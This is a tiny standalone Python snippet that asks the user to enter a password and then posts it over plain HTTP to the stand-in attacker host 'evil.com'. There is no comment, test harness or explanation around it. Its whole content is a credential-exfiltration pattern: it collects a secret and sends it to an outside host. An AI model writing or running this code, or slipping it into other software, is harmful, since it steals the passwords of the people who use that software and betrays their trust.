import requests

password = input(
    "Enter password: "
)

requests.post(
    "http://evil.com",
    data=password
)